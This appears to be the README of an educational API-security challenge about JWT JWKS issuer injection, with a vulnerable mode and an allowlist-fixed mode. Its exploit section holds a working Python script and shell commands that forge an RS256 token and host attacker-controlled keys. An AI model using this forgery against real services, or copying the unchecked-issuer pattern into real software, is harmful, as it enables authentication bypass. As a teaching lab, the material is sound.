# JWT JWKS Issuer Injection

This challenge demonstrates a JWT implementation that builds the JWKS endpoint URL directly from the token's own unverified `iss` claim (`<iss>/.well-known/jwks.json`) and fetches whatever key set lives there, with no allowlist of trusted issuers. An attacker who controls a claimed issuer value also controls the keys used to "verify" their own token.

## How to run it

```bash
go run main.go serve
```

This starts the vulnerable API on port 8080 and a mock legitimate identity provider (serving its real JWKS) on port 8090.

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the issuer claim is used unchecked to build the JWKS URL to fetch
go run main.go serve --vulnerable=true

# fixed: the issuer claim is checked against an allowlist before being used
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
# Get a sample legit token — the API fetches JWKS from the real issuer and it works
TOKEN=$(go run main.go jwt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"

# Forge a token: mint our own key pair, host our own JWKS, and claim to be
# whatever issuer points at it. The API never checks if that issuer is trusted.
mkdir -p /tmp/attacker-idp/.well-known && cd /tmp/attacker-idp

python3 -c "
import json
from cryptography.hazmat.primitives.asymmetric import rsa
import jwt
from jwt.algorithms import RSAAlgorithm

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
jwk = json.loads(RSAAlgorithm.to_jwk(key.public_key()))
jwk.update(kid='attacker-key', alg='RS256', use='sig')
json.dump({'keys': [jwk]}, open('.well-known/jwks.json', 'w'))

forged = jwt.encode(
    {'iss': 'http://localhost:9999', 'sub': 'attacker'},
    key,
    algorithm='RS256',
    headers={'kid': 'attacker-key'},
)
open('forged_token.txt', 'w').write(forged)
"

# Host the JWKS at the issuer URL we just claimed
python3 -m http.server 9999 &

FORGED=$(cat forged_token.txt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $FORGED"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
